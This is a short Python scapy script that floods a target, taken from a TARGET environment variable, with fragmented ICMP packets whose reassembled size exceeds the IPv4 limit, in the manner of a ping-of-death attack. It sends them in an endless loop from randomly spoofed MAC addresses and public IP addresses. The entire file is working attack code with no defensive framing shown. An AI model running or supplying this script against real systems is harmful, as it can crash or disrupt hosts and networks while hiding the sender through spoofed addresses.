#!/bin/python
import sys
from scapy.config import conf
conf.ipv6_enabled = False
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
import fcntl, socket, struct
from collections import OrderedDict
from time import sleep
from httplib import HTTPConnection, _CS_IDLE
import urlparse, string, random
victim = os.getenv('TARGET', '127.0.0.1')
dst_mac = None
while dst_mac == None:
   dst_mac = getmacbyip(victim)
interface = conf.route.route(victim)[0]


class RandNormalIP(RandString):
    def __init__(self, iptemplate="0.0.0.0/0"):
        self.ip = Net(iptemplate)
    def _fix(self):
        x = self.ip.choice()
        while ((x in Net("0.0.0.0/8")) or (x in Net("10.0.0.0/8")) or (x in Net("127.0.0.0/8"))
                or (x in Net("172.16.0.0/12")) or (x in Net("192.168.0.0/16")) or (x in Net("224.0.0.0/4"))):
            x = self.ip.choice()
        return x

print('Sending IPv4 fragments that result in too large packet from random MAC/IP to '+victim+' ('+dst_mac+') from '+interface+' interface. Press Ctrl-C to interrupt')

while 1:
  try:
    dest_mac = RandMAC()
    src_mac = RandMAC()
    sendp(fragment(Ether(src=RandMAC(),dst=dst_mac)/IP(src=RandNormalIP(),dst=victim)/ICMP()/("X"*65600)),iface=interface,inter=0.1,loop=1)
  except KeyboardInterrupt:
   raise
